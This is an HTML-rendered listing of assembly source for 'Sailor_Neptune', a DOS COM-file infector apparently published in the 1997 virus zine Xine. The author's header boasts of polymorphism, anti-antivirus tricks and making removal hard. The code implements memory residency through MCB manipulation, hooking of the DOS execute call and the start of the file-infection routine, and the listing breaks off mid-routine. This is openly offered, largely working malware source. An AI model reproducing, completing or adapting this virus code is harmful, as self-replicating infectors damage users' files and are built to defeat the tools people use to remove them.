<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>neptune.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 028 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name    : Sailor_Neptune</span><span class="sc0">
</span><span class="sc1">; Virus Author  : b0z0</span><span class="sc0">
</span><span class="sc1">; Origin        : Padania, March/April 1997</span><span class="sc0">
</span><span class="sc1">; Compiling     : Use TASM 3.0</span><span class="sc0">
</span><span class="sc1">;                       tasm /m5 neptune.asm</span><span class="sc0">
</span><span class="sc1">;                       tlink /t neptune</span><span class="sc0">
</span><span class="sc1">; Tech Desc     : Sailor_Neptune is a quite simple TSR COM infector,</span><span class="sc0">
</span><span class="sc1">;                 that will place itself not at the end of the file but</span><span class="sc0">
</span><span class="sc1">;                 in a random position in the middle of the file.</span><span class="sc0">
</span><span class="sc1">;                 It is just a little bit polymorphic. The sequence of</span><span class="sc0">
</span><span class="sc1">;                 the operations in the decryptor is always the same,</span><span class="sc0">
</span><span class="sc1">;                 but registers and operations are changed. The key</span><span class="sc0">
</span><span class="sc1">;                 of the operation (add,sub,xor) is changed with another</span><span class="sc0">
</span><span class="sc1">;                 math operation. This little polymorphism isn't aimed</span><span class="sc0">
</span><span class="sc1">;                 to make the virus unscannable (since it is very simple</span><span class="sc0">
</span><span class="sc1">;                 and scannable :) ), but is rather done to make the</span><span class="sc0">
</span><span class="sc1">;                 disinfection procedure harder. Of course the piece of</span><span class="sc0">
</span><span class="sc1">;                 the file that has been overwritten by the virus is saved</span><span class="sc0">
</span><span class="sc1">;                 at the end of the file. Of course it is encrypted.</span><span class="sc0">
</span><span class="sc1">;                 There are some AV-tricks in the virus (TBClean for</span><span class="sc0">
</span><span class="sc1">;                 example will just cut the .COM at the virus position</span><span class="sc0">
</span><span class="sc1">;                 and leaving a JMP AX as the first opcodes in the</span><span class="sc0">
</span><span class="sc1">;                 'cleaned' file ;) ) to make scanning and removing</span><span class="sc0">
</span><span class="sc1">;                 even harder. To fool TBScan (always) and AVP</span><span class="sc0">
</span><span class="sc1">;                 (just sometimes, quite never) the COMs will have the entry</span><span class="sc0">
</span><span class="sc1">;                 point simillar to a PKlited file. So a 'packed program'</span><span class="sc0">
</span><span class="sc1">;                 warning may appear :)</span><span class="sc0">
</span><span class="sc1">;                 Of course this 'midplacing' method makes also CRC to</span><span class="sc0">
</span><span class="sc1">;                 miserably fail.</span><span class="sc0">
</span><span class="sc1">;                 Since the virus is placed somewhere in the middle of</span><span class="sc0">
</span><span class="sc1">;                 the file it isn't possible to do the simple lenght</span><span class="sc0">
</span><span class="sc1">;                 addition (as Yosha suggest) to the CRC after the</span><span class="sc0">
</span><span class="sc1">;                 coms that have the enuns selfcheck, because it</span><span class="sc0">
</span><span class="sc1">;                 may be just where the virus has been placed. So</span><span class="sc0">
</span><span class="sc1">;                 instead of risking this the virus will simply skip</span><span class="sc0">
</span><span class="sc1">;                 those coms.</span><span class="sc0">
</span><span class="sc1">;                 There isn't too much to say about this virus. Since</span><span class="sc0">
</span><span class="sc1">;                 it infects just COMs i don't think it will have good</span><span class="sc0">
</span><span class="sc1">;                 possibilityes to spread around. On the other side i</span><span class="sc0">
</span><span class="sc1">;                 think (well, i hope) that removing this virus isn't</span><span class="sc0">
</span><span class="sc1">;                 really simple, so AV-ers will have to work a little :)</span><span class="sc0">
</span><span class="sc1">;                 Well, that's all for now ;)</span><span class="sc0">
</span><span class="sc1">;                 I had some more projects for this virus (to make it</span><span class="sc0">
</span><span class="sc1">;                 a lot better) but due to time restrictions this virus</span><span class="sc0">
</span><span class="sc1">;                 hasn't been finished as i have initially hoped.</span><span class="sc0">
</span><span class="sc1">;                 But that's life ;))</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">neptune</span><span class="sc0">         </span><span class="sc9">segment</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">neptune</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">neptune</span><span class="sc1">; es:neptune</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_start</span><span class="sc0">     </span><span class="sc1">; mov reg_pointer,offset</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_nopoly</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; mov reg_counter,size</span><span class="sc0">
</span><span class="sc5">operator</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">; mov reg_operand,init_value</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; oper [reg_pointer],reg_oper</span><span class="sc0">
</span><span class="sc5">modifyer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">; oper reg_oper,oper_value</span><span class="sc0">
</span><span class="sc5">inc_memory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; inc reg_pointer</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; inc reg_pointer</span><span class="sc0">
</span><span class="sc5">decrement</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; dec reg_counter</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">decrypt_loop</span><span class="sc0">
</span><span class="sc5">enc_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; just to be precise correct</span><span class="sc0">
                                                </span><span class="sc1">; the stack from the 'PK' :)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">                           </span><span class="sc1">; delta offset</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3026h</span><span class="sc0">                        </span><span class="sc1">; install check</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2630h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_installed</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_com</span><span class="sc0">
</span><span class="sc5">not_installed</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                           </span><span class="sc1">; psp</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; mcb</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">check_mcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">            </span><span class="sc1">; last?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">last_block</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; on next</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_mcb</span><span class="sc0">
</span><span class="sc5">last_block</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">para_virus</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">para_virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; virus mcb segment</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">para_virus</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; virus segment</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; so CS:IP will be correct</span><span class="sc0">
                                                </span><span class="sc1">; considering that the adresses</span><span class="sc0">
                                                </span><span class="sc1">; are calculated from start</span><span class="sc0">
                                                </span><span class="sc1">; as CS:100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_words</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; copy virus</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_int21</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; install int21h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">086h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">old_21_off</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">old_21_seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">restore_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e0ffh</span><span class="sc0">         </span><span class="sc1">; jmp ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">return_antitbclean</span><span class="sc0">    </span><span class="sc1">; calculate return jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">; just to fuck tbclean</span><span class="sc0">
                                                        </span><span class="sc1">; or simillar progs</span><span class="sc0">

</span><span class="sc5">return_antitbclean</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_old</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; restore first 5 bytes</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_pos</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; original bytes pos</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_value</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; position dec value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">std</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_dec_orig</span><span class="sc0">                    </span><span class="sc1">; decrypt original</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_pos</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; virus position</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; jump to cs:0FEh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0a4f3h</span><span class="sc0"> </span><span class="sc1">; REP MOVSB</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; go there!</span><span class="sc0">

</span><span class="sc5">first_old</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">virus_pos</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virus_end_mem</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; where the virus resides</span><span class="sc0">
</span><span class="sc5">orig_pos</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virus_end_mem</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; where the original body</span><span class="sc0">
                                                </span><span class="sc1">; is placed (= filelenght)</span><span class="sc0">

</span><span class="sc5">virus_int21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3026h</span><span class="sc0">                </span><span class="sc1">; residency check</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_rescheck</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">no_rescheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                </span><span class="sc1">; execute</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">execute</span><span class="sc0">

</span><span class="sc5">chain_old_21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_21_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_21_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Sailor_Neptune'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">execute</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                </span><span class="sc1">; save int 24h handler</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_24off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_24seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_24handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; set our int 24h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">; get attributes</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; push attribs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; push filename seg:off</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; delete attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">attrib_set</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_writing</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                  </span><span class="sc1">; adjust stack and exit</span><span class="sc0">
</span><span class="sc5">first_exit</span><span class="sc4">:</span><span class="sc0">
